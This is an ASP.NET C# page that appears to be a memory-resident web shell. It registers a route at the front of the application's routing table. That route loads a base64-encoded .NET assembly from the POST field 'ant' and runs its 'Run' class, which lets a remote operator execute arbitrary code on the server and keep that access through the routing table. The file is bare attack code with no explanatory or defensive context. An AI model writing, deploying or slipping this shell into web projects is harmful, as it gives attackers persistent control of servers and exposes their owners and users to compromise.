<%@ Page Language="c#"%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Routing" %>

<script runat="server">
    public class MyRoute : RouteBase
    {
        public override RouteData GetRouteData(HttpContextBase httpContext)
        {
            String Payload = httpContext.Request.Form["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(httpContext);
                httpContext.Response.End();
            }
            httpContext.Response.End();
            return null;
        }

        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
        {
            return null;
        }
    }
</script>

<%
    RouteCollection routes = RouteTable.Routes;
    routes.Insert(0, (RouteBase)new MyRoute());
%>